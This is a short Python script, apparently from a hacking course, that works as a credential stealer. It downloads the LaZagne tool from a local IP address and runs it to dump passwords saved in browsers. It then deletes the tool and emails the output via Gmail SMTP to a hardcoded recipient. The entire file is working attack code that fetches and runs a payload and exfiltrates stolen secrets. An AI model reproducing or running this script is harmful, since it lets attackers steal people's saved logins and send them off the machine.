#!/usr/bin/env python3
import subprocess
import requests
import smtplib  # Para el envío de emails
from email.mime.text import MIMEText  # Para crear el cuerpo del mensaje de email
from termcolor import colored
import tempfile
import os

# Método para enviar emails
def send_email(subject, body, sender, recipients, password):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = ', '.join(recipients)

    # Establece conexión con el servidor SMTP y envía el email
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
        smtp_server.login(sender, password)
        smtp_server.sendmail(sender, recipients, msg.as_string())
    print(colored(f"\n[+] Email sent Successfully!!", "green"))

def run_command (command):

    output_command =subprocess.check_output(command, shell=True)

    return output_command.decode("cp850")  # No utiliza utf-8 en windows.


def download_and_execute_lazagne():

    r = requests.get("http://192.168.1.40/lazagne.exe")
    temp_file = tempfile.mkdtemp()
    os.chdir(temp_file)

    with open("lazagne.exe", "wb") as f:
        f.write(r.content)

    lazagne_output =run_command("lazagne.exe browsers")

    os.remove("lazagne.exe")

    return lazagne_output
    
if __name__ == '__main__':

    output_lazagne = download_and_execute_lazagne()
    send_email("Lazagne Info", output_lazagne, "elquenviaelmensaje@gmail.com", ["Elquerecibeelmensaje@gmail.com"], "Contraseña de la API")
    